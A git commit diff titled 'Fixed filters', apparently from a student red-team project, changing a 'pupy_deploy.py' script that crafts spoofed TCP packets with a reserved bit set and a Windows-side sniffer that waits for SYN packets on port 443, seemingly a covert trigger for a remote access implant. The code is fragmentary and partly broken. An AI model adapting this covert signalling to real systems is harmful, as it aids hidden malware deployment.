35610090f1c3f13942793c8a582878c9d33614ab
JonLMyers <jlm4508@rit.edu>
2019-10-24 23:04:17 -0400

    Fixed filters

--- pupy_deploy.py
+++ pupy_deploy.py
@@ -1,4 +1,5 @@
 import scapy
 
 def main():
+    packet = send(IP(src='127.0.0.1', dst='192.168.1.151')/TCP(sport=443,dport=1337,reserved=1))
     packet = Ether()/IP(src='127.0.0.1', dst='192.168.1.151')/TCP(dport=443,flags='S',reserved=1)     
--- test.py
+++ test.py
@@ -7,7 +7,7 @@ import win32event
 import win32service
 
 def main():
-    capture = pyshark.LiveCapture(bpf_filter='(tcp src port 1337)')
+    capture = pyshark.LiveCapture(bpf_filter='(tcp src port 443) and (tcp[13] & 2 != 0)')
     while True:
         for packet in capture.sniff_continuously(packet_count=50):
             print('Just arrived:', packet)
